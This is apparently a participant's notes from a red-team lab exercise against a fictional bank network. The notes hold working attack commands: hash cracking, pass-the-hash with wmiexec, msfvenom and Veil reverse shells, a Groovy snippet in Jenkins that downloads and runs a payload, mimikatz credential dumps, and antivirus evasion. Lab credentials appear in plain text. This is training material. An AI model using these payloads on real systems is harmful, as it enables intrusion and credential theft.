* Commands

./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359 administrator@10.59.4.20

reverse handler:
msfconsole -x "use exploit/multi/handler;\
> set RHOST 10.59.4.100;\
> set LPORT 443;\
> run"

John
john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 alice.ntlmv2 


* Challenge 1

Can you find Alice's password? Note refer to the attached responder output.

** Downloaded responder output txt
** see NTLM hash
[HTTP] NTLMv2 Client   : 10.58.122.100
[HTTP] NTLMv2 Username : ALICE\alice
[HTTP] NTLMv2 Hash     : alice::ALICE:1122334455667788:773EA54F06D1E9D58524469DAF1D5813:01010000000000007D80B569A678D10118E06AA31404B882000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000003000001EF1D3F15357FFB09A8667ACC2A6DA00A9497F87B70CA6192B1AA5BBBA8BC5540A0010000000000000000000000000000000000009001A0048005400540050002F0069006E007400720061006E00650074000000000000000000

+ Need to load password list into *john* 
john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 alice.ntlmv2 

** output:

*Elefant15*        (alice)

1g 0:00:00:08 DONE (2019-06-27 10:59) 0.1145g/s 1282Kp/s 1282Kc/s 1282KC/s Eliseulove..Edward14.

* Challenge 2 

Can you find the NTLM hash for the local Administrator account? Flag format 32-hex

** Setup
*Note* Downloaded the openvpn profiles, will use the internal profile
~openvpn shared_533-redinternal.ovpn~
then login: password 0efaf267b804
username: shared
*Note* uncommented 

Old Alice's IP is:
*10.58.122.100*

New Alice IP is:
*10.59.4.20*



+ What would you do next with the password?
Some users could be local administrators on their systems, then you can connect back
to the systems and execute commands.

+ Interactions
  * remote powershell
  * WMI
  * smbexec
  * pth - pass the hash tools - start with ~pth-wmic~

** Log

fingerprinting the host with nmap
nmap -O -v 10.59.4.20

*** Nmap scan
Nmap scan report for 10.59.4.20
Host is up (0.089s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
MAC Address: 00:16:3E:2E:DE:40 (Xensource)

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=6/27%OT=135%CT=1%CU=37656%PV=Y%DS=1%DC=D%G=Y%M=00163E%
OS:TM=5D14A79B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=
OS:I%SS=S%TS=7)OPS(O1=M52CNW8ST11%O2=M52CNW8ST11%O3=M52CNW8NNT11%O4=M52CNW8
OS:ST11%O5=M52CNW8ST11%O6=M52CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2
OS:000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M52CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=
OS:80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
OS:%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=80%CD=Z)

*** Pass the hash
~pth-wmic~ 
~wmiexec.py~
/usr/share/doc/python-impacket/examples/wmiexec.py
/usr/share/doc/python-impacket/examples/wmiexec.py

*** Remote shell
usage: wmiexec.py  alice:Elefant15@10.59.4.20

/usr/share/doc/python-impacket/examples/wmiexec.py alice:Elefant15@10.59.4.20

*got shell*

~whoami~:
insecurebank\alice

then dumped SAM and SYSTEM with 
reg save HKLM\SAM r-sam.hive
reg save HKLM\SYSTEM r-system.hive

donwloaded the dumps with ~get~ in wmi shell

*** Note: mimikatz help
[[https://blog.ropnop.com/practical-usage-of-ntlm-hashes/][Practical usage of ntlm hashes]]

Question: are we already a local admin?
We can check with ~whoami /groups~

*** TODO whoami (Windows)


+ When we have the hashes we can use samdump2
root@kali:~/Downloads# samdump2 r-system.hive r-sam.hive 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

*** Hash structure, username : something : LM hash : NTLM hash

*** TODO hashid (identify type of hash)

What do we do with the captured admin passwords?
We could use the admin password on *other workstations* that may have been imaged 
from the same image.

*** Logging in as administrator

~wmiexec~ also allows us to use Pass the Hash, so we can try to re-login into the administrator account

wmiexec has authentication 
 - hashes LMHASH:NTHASH

which in my case aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359

./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:77e0771814213b2747124b0c0fb30359 administrator@10.59.4.20

DOMAIN: insecurebank

we see there are different users - 'bob'

* Challenge 2.5

Store - we want to get credit card data

* Challenge 3
** Description
Edward's SSH key

Find Edward's ssh private key. Flag format: There is a 32-hex key on the DEK-Info line.

Trying to prepare metasploit payload

my local ip is 10.59.4.104

+ Reverse shell
msfvenom --payload windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai -i 5 LHOST=10.59.4.104 LPORT=443 > reverse-443.exe

+ Bind shell:
msfvenom --payload windows/meterpreter/bind_tcp --format exe --encoder x86/shikata_ga_nai -i 5 RHOST=10.59.4.20 LPORT=443 > bind-443.exe

*** TODO msfvenom cheat sheet
[[https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/][msfvenom cheat sheet]]

Try to create reverse shell
~msfconsole~
use exploit/multi/handler
set LHOST 10.59.4.104
set LPORT 443

Host 10.59.4.14:8080 is running Jenkins 2.125

It should have an information disclosure vulnerability:
https://www.cybersecurity-help.cz/vdb/SB2018121801

https://jenkins.io/security/advisory/2018-12-05/

** Network map
10.59.4.*
.14 - jenkins server
.13 - 
.20 - Alice, windows 8.1 - got password
.21 - Bob 
.22 - Charles - cannot run meterpreter
.23 - D - dave
.24 - E Edward - windows 8.1 9600
.25 - windows, fred - got password
 + Fred: WildFred8300

** Timeline 
14:28 - used mimikatz through metasploit 
~msv~ credentials - shows only Alice's credentials

14:30 - attempted to upload a reverse shell to .22 machine (charles)
- file gets disappeared
14:43

Extracted excel file from .25 - 
 + cracked the password - WildFred8300

14:48 - got meterpreter on .24
running ~msv~ shows users EDWARDS

running mimikatz_command -f samdump::hashes
shows 

15:00 captured prod.key from edwards
 - prod.key

15:20 - jenkins password
*** Jenkins job output of 
~cat /var/lib/jenkins/*.xml~

 <java.util.concurrent.CopyOnWriteArrayList>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <scope>GLOBAL</scope>
          <id>ffc2f9e0-02b6-4d34-8b16-96c22945f750</id>
          <description>test</description>
          <username></username>
          <password>{AQAAABAAAAAwwxpsXzQEg1RdEol3PEE1NrwNq8X8JMGTlffcz/yAS+CRsUGC1YgjuKqGU/c+C+M2gYJBvczf6pSx6hDXiIoC9w==}</password>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <scope>GLOBAL</scope>
          <id>24dad117-a27e-4c58-bb8a-f544564528b7</id>
          <description>Yoda User</description>
          <username></username>
          <password>{AQAAABAAAAAwejhWzh4CMShoXUyYgFOuzRwMpH7SWCj17VWni24Xhq/Vkiu2hQeQH07GQt8Ql7j9Zw/AK77a57VU+7VJG22/QA==}</password>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <scope>GLOBAL</scope>
          <id>7b5076ae-1f92-43bd-9459-d12eda67695d</id>
          <description>Tomcat Manager</description>
          <username></username>
          <password>{AQAAABAAAAAgpZgjaIfvHZiqDJFBXbvDTALaaa4jgkVj28x3VWNb9W/2Bfoa2X2k0bmRkYZltydM}</password>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
      </java.util.concurrent.CopyOnWriteArrayList>

*** Password decrypt in jenkins:
https://devops.stackexchange.com/questions/2191/how-to-decrypt-jenkins-passwords-from-credentials-xml

go to [jenkins]/script

*** Run this in jenkins script 
Jenkins script windows - http://10.59.4.13:8080/script
println(hudson.util.Secret.decrypt("{AQAAABAAAAAgpZgjaIfvHZiqDJFBXbvDTALaaa4jgkVj28x3VWNb9W/2Bfoa2X2k0bmRkYZltydM}"))

Tomcat manager:
Result: $zFSKM#o#S3QrDS!D(nq

Test 
password: 8I8_3Av|-:w7Y6|%_-0_^9t2IHRXL1~J

Yoda:
password: This is not the password you're looking for.

*** Vault - .13
http://10.59.4.13:8080/vsEncryptionPhrase

*** *Tomcat* exploitation

Password for the tomcat manager: 
Result: $zFSKM#o#S3QrDS!D(nq

manager url: http://10.59.4.13:8080/manager/
login: tomcat
Result: $zFSKM#o#S3QrDS!D(nq

Tomcat default credentials site: https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

Let's generate a reverse shell:
+ Reverse shell
msfvenom --payload java/meterpreter/reverse_tcp --format war LHOST=10.59.4.104 LPORT=443 > reverse443.war

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.59.4.104 LPORT=443 -f war > shell.war

nc -lnvp 443

*** environment variables from the tomcat server

export from the server:
export CHALLENGE_USER='*shared*'
export GPG_KEYS='05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 713DA88BE50911535FE716F5208B0AB1D63011C7 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 80FF76D88A969FE46108558A80B953A041E49465 8B39757B1D8A994DF2433ED58B3A601F08C975E5 A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 B3F49CD3B9BD2996DA90F817ED3873F5D3262722 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23'

~cat ~/hsqldb.scripts~
INSERT INTO VS_USER VALUES(1,'Administrator Account','root@localhost.com',TRUE,TRUE,'5033b55c74e5c56686f25bb6f2d21f79','Administrator','admin')

INSERT INTO VS_CREDENTIAL VALUES(1,NULL,NULL,'ssh passphrase for production machines',NULL,'VfaMEAdo2luxkvvnmMQ3EQ==',FALSE,NULL,NULL,NULL)
INSERT INTO VS_DATABASE_VERSION VALUES(1,0,'0.6.7')
INSERT INTO VS_ENCRYPTION_VERIFICATION VALUES(1,0,'X+94zVoou/pcz8CwUsb1y2YzLq0mK/kIzx5H1riOB5H2PqDyaacg+eOSmufFD9EqnN5XVBKJHbdbkWEXaHj0WUOBdG6mv/y/psN1gem46Io=')

md5 reverse of '5033b55c74e5c56686f25bb6f2d21f79' == funkeymonkey124

-> worked for Federico in Vault
-> username = admin, password was funkeymonkey124

OS on the .13 machine (Tomcat + Vault) is Ubuntu 16.04 LTS

*** edward's ssh passphrase in the vault
Aiwaib6s

*** Menno cracked an excel file from (probably fred's machine)
The encrypted excel file was using a password which also worked for KeePass
The password was probably also Fred's password

*** TODO jenkins slave - Dev Server
http://10.59.4.14:8080/computer/dev_server/systemInfo
Java 10.0.1
Windows Server 2012 R2
user.name	DEV_SERVER$
10.59.4.12

* Observations from day 1

*** Better notekeeping - shared notes
*** Better oversight of getting to the goal
*** Keep track of the progress

* Day 2
** Veil evasion output
 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/CutePuppy.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/CutePuppy.rc


9:07
Running nmap against .12

**** nmap output 10.59.4.12
#+BEGIN_EXAMPLE
root@kali:~/Downloads/22-c# nmap -sV 10.59.4.12
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-28 09:07 UTC
Nmap scan report for 10.59.4.12
Host is up (0.10s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 00:16:3E:3B:70:A9 (Xensource)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.38 seconds
#+END_EXAMPLE

9:12 - uploaded CutePuppy.bat to .21
tried to ~type~ the batch file, but it says 
Operation did not complete successfully because the file contains a virus or potentially unwanted software.

9:15 - generated a new one, with c# - seesaw.exe
9:21 - uploaded to the machine .21
9:21 - file disappeared after execution again (antivirus)

9:23 - generating new one with Veil - C
9:25 - caught by AV again

 slave
Running as a SYSTEM

JVM post-exploitation one-liners
https://gist.github.com/frohoff/a976928e3c1dc7c359f8
http://localhost:8080/reverse-443.exe

Host

*** Groovy code in Jenkins console

def remoteUrl = "http://10.59.4.100:8080/reverse-443.exe"
def file = new FileOutputStream("c:\\reverse-443.exe")
def out = new BufferedOutputStream(file)
out << new URL(remoteUrl).openStream()
out.close()

execute with 
println "c:\\reverse-2.exe".execute().text

Now we got a metasploit console at 9:40
~getsystem~

load mimikatz, then
meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : dev_server.insecurebank.local
BootKey    : 9e74a3487fcd17ded74f711fed041904

Administrator hash

Rid  : 500
User : Administrator
LM   : 
NTLM : e6aaafea4f9a779c5049081370e0bcbb

Rid  : 501
User : Guest
LM   : 
NTLM : 

Rid  : 1004
User : DEV_Admin
LM   : 
NTLM : fc0d2496db1c6fb501843b767d5cfd08

Rid  : 1005
User : olaf
LM   : 
NTLM : b222c55cf18c19101c1f49ba99e634e0

Jenkins slave - used groovy script console to download a reverse shell,
then used script console to execute the reverse shell
Then ran mimikatz in meterpreter to obtain samdump


** Looking into the .3 network

root@kali:~/Downloads# nmap -sn 10.59.3.0-255
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-28 10:18 UTC
Nmap scan report for 10.59.3.5
Host is up (0.0079s latency).
Nmap scan report for 10.59.3.8
Host is up (0.0067s latency).
Nmap scan report for 10.59.3.9
Host is up (0.0074s latency).
Nmap scan report for 10.59.3.10
Host is up (0.0066s latency).

*** Fred's password - 
rjgobM46@xLVZ4iq12Eo7FTFeL


10.59.4.17

10:43 - started scan of the 10.59.5.*
root@kali:~/Downloads# nmap -sP 10.59.5.0-255
Nmap done: 256 IP addresses (0 hosts up) scanned in 206.29 seconds

Yesterday 

Mimikatz:
if getting https://security.stackexchange.com/questions/137002/error-when-using-metasploit-mimikatz-module

Pass the hash with ntlm:
./wmiexec.py -hashes :fc0d2496db1c6fb501843b767d5cfd08 insecurebank\dev_admin@10.59.4.17
did't work as dev_admin is likely only a local account

*** domain users
running ~net user /domain~ on .12

=c:\Program Files\Java\jre-10.0.1\bin>net user /domain
net user /domain
The request will be processed at a domain controller for domain insecurebank.local.


User accounts for \\DC1.insecurebank.local

-------------------------------------------------------------------------------
Administrator            alice                    bob                      
charles                  dave                     edward                   
fred                     Guest                    krbtgt                   
The command completed with one or more errors.

*** second administrator

./wmiexec.py -hashes :e6aaafea4f9a779c5049081370e0bcbb administrator@10.59.4.17
-> logon failure

* Machines on the network

.11 - kerberos, AD \\DC1
.12 - Jenkins slave, reverse root shell
.13 - Apache Tomcat - vault, reverse root shell
.14 - Jenkins - shell, 
.15 - vnc, x11 - ** TODO
.16 - Windows server, RDP, netbios
.17 - windows server, RDP, netbios

** Jenkins 

we connected via a simple reverse shell with groovy script pasted in Jenkins shell
Then were able to look into ~ (jenkins home) directory and find a ~secrets~ file

We could have also added a local user through jenkins shell and log in through wmiexec 


** 10.59.4.16 - Windows Server
11:27 - connected via wmiexec using admin and the above hash
11:49 - there is xampp installed, has a list of default passwords
c:\xampp\tmp has a couple of leftover files
~whoami~ - intranet\administrator
c:\xampp\mysql\data has some recently modified files


apache seems to be started
http://10.59.4.16/phpmyadmin

I managed to kill apache somehow :(

Says:
**** Apache listing
#+BEGIN_EXAMPLE
Access forbidden!

New XAMPP security concept:

Access to the requested object is only available from the local network.

This setting can be configured in the file "httpd-xampp.conf".

If you think this is a server error, please contact the webmaster.
Error 403
10.59.4.16
Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.19 
#+END_EXAMPLE
-> Should configure httpd-xampp.conf

Config file is in c:\xampp\apache\ somewhere (?)

* Day 2 continued

** getting Bob's credentials

**** mimikatz 
~msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.59.4.101 LPORT=443~ 

*** TODO look at the credential guard and flaws

generated new reverse shell with:
#+BEGIN_EXAMPLE
veil
use 29)	python/shellcode_inject/aes_encrypt.py
generate
shellcode: 2 (msfvenom)
set up LHOST and LPORT
#+END_EXAMPLE
- this one didn't work - as it didn't connect back to me

generated new reverse shell with
veil
use 7 - c/meterpreter/rev_tcp.py
Pure C Reverse TCP Stager
set up LHOST and LPORT
deploy with wmiexec shell
executed ~see.exe~

now in meterpreter I got system ~getsystem~, then I loaded mimikatz - ~load mimikatz~
running mimikatz, executed ~msv~

**** msv output on .16
#+BEGIN_EXAMPLE
[*] Retrieving msv credentials
msv credentials
===============

AuthID     Package    Domain          User           Password
------     -------    ------          ----           --------
0;1802806  Kerberos   insecurebank    bob            mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
0;1584398  Negotiate  Window Manager  DWM-2          mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
0;51773    Negotiate  Window Manager  DWM-1          mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
0;996      Negotiate  insecurebank    INTRANET$      mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
0;997      Negotiate  NT AUTHORITY    LOCAL SERVICE  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
0;30430    NTLM                                      mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
0;999      Negotiate  insecurebank    INTRANET$      mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
#+END_EXAMPLE

+ *Looks like we couldn't get bob's credentials now*

+ This error indicates I should migrate to a 64-bit process
- ~see.exe~ (my reverse shell binary) is shown as x86 - let's find a suitable x64 process

**** ps output
meterpreter > ps
#+BEGIN_EXAMPLE
Process List
============

 PID    PPID   Name                  Arch  Session  User                          Path
 ---    ----   ----                  ----  -------  ----                          ----
 0      0      [System Process]                                                   
 4      0      System                x64   0                                      
 208    4      smss.exe              x64   0                                      
 300    292    csrss.exe             x64   0                                      
 352    344    csrss.exe             x64   1                                      
 360    292    wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 388    344    winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 448    360    services.exe          x64   0                                      
 456    360    lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 512    448    svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 552    448    svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 564    448    GRRservice.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\GRR\3.1.0.2\GRRservice.exe
 612    448    spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 644    388    LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 660    388    dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 672    448    svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 724    448    svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 784    448    svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 836    448    svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 844    448    svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1000   448    svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1052   564    GRR.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\GRR\3.1.0.2\GRR.exe
 1088   448    splunkd.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
 1252   1088   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 1256   2068   csrss.exe             x64   2                                      
 1276   448    sysmon.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\sysmon.exe
 1304   724    taskhostex.exe        x64   2        insecurebank\bob              C:\Windows\System32\taskhostex.exe
 1340   448    svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1380   448    winlogbeat.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\winlogbeat\winlogbeat.exe
 1484   448    wlms.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wlms\wlms.exe
 1532   448    nssm.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\nssm.exe
 1612   2676   rdpclip.exe           x64   2        insecurebank\bob              C:\Windows\System32\rdpclip.exe
 2052   448    msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2208   1088   splunk-winevtlog.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\SplunkUniversalForwarder\bin\splunk-winevtlog.exe
 2416   512    unsecapp.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\unsecapp.exe
 2440   2068   winlogon.exe          x64   2        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 2676   448    svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2796   448    svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 3092   2440   dwm.exe               x64   2        Window Manager\DWM-2          C:\Windows\System32\dwm.exe
 4028   4004   explorer.exe          x64   2        insecurebank\bob              C:\Windows\explorer.exe
 4396   5100   iexplore.exe          x86   2        insecurebank\bob              C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
 4752   4028   xampp-control.exe     x86   2        insecurebank\bob              C:\xampp\xampp-control.exe
 5100   4028   iexplore.exe          x64   2        insecurebank\bob              C:\Program Files\Internet Explorer\iexplore.exe
 5664   4028   mmc.exe               x64   2        insecurebank\bob              C:\Windows\System32\mmc.exe
 5724   2404   cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
 5764   5724   conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
 5812   5724   powershell.exe        x64   0        INTRANET\Administrator        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 6080   5352   mmc.exe               x64   2        insecurebank\bob              C:\Windows\System32\mmc.exe
 8972   10608  cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
 10916  8972   conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
 11500  12064  cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
 11540  10608  cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
 11548  11540  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
 11872  11500  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
 14552  1532   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 14624  512    WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 14712  14580  cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
 14920  15180  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
 14936  14624  powershell.exe        x64   0        INTRANET\Administrator        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 14948  14712  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
 14980  1532   xampp_start.exe       x86   0        NT AUTHORITY\SYSTEM           c:\xampp\xampp_start.exe
 15108  14936  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
 15180  14936  powershell.exe        x86   0        INTRANET\Administrator        c:\windows\syswow64\windowspowershell\v1.0\powershell.exe
 15232  14712  see.exe               x86   0        INTRANET\Administrator        C:\xampp\see.exe
#+END_EXAMPLE

**** migrating to a 64-bit process

migrate 5724

then credentials:
#+BEGIN_EXAMPLE
kerberos credentials
====================

AuthID     Package    Domain          User           Password
------     -------    ------          ----           --------
0;1802806  Kerberos   insecurebank    bob            
0;996      Negotiate  insecurebank    INTRANET$      
0;997      Negotiate  NT AUTHORITY    LOCAL SERVICE  
0;30430    NTLM                                      
0;1584398  Negotiate  Window Manager  DWM-2          96 53 64 a4 e5 87 dc f8 c1 81 dd 0b 84 c0 8a 64 c9 4e 76 5a 73 79 63 d4 8f 4f 14 8e cd 5c ba 8e 50 32 9f 59 59 90 0f da 2a 55 eb 23 7d 33 0f 77 4a 97 6c ce 65 5d 68 43 f6 10 a8 3c 45 33 c7 79 19 c0 c5 3f 1e 69 79 04 e2 96 71 0e 38 5e 3c 67 bb 75 2f e4 54 f0 1b 67 98 1c 25 83 8d 1c 17 ad df 09 b1 c1 f3 84 e3 a8 78 2c 88 b1 07 f8 12 6a c2 c1 a5 44 7a 4e 72 f0 88 97 64 9d 61 9b b3 9c f2 ff 84 30 58 2f 71 e3 d7 bb b7 6c fe 35 89 8d cb bc fd 0f d9 cf f8 09 68 6b 41 c4 0e 71 71 96 1e 9f 41 60 39 34 85 39 2a f8 fb 15 be 35 48 16 32 22 b8 56 b9 ed 81 5a 54 a1 66 74 f1 72 89 89 1a ae 88 c8 82 a7 8a e7 48 69 44 de d9 c5 f4 86 4b 64 82 75 e9 37 07 80 75 47 fd bb 44 57 9a 19 28 83 a3 d3 ab c9 15 24 fd bb 6e f7 5b 35 c9 b9 
0;51773    Negotiate  Window Manager  DWM-1          96 53 64 a4 e5 87 dc f8 c1 81 dd 0b 84 c0 8a 64 c9 4e 76 5a 73 79 63 d4 8f 4f 14 8e cd 5c ba 8e 50 32 9f 59 59 90 0f da 2a 55 eb 23 7d 33 0f 77 4a 97 6c ce 65 5d 68 43 f6 10 a8 3c 45 33 c7 79 19 c0 c5 3f 1e 69 79 04 e2 96 71 0e 38 5e 3c 67 bb 75 2f e4 54 f0 1b 67 98 1c 25 83 8d 1c 17 ad df 09 b1 c1 f3 84 e3 a8 78 2c 88 b1 07 f8 12 6a c2 c1 a5 44 7a 4e 72 f0 88 97 64 9d 61 9b b3 9c f2 ff 84 30 58 2f 71 e3 d7 bb b7 6c fe 35 89 8d cb bc fd 0f d9 cf f8 09 68 6b 41 c4 0e 71 71 96 1e 9f 41 60 39 34 85 39 2a f8 fb 15 be 35 48 16 32 22 b8 56 b9 ed 81 5a 54 a1 66 74 f1 72 89 89 1a ae 88 c8 82 a7 8a e7 48 69 44 de d9 c5 f4 86 4b 64 82 75 e9 37 07 80 75 47 fd bb 44 57 9a 19 28 83 a3 d3 ab c9 15 24 fd bb 6e f7 5b 35 c9 b9 
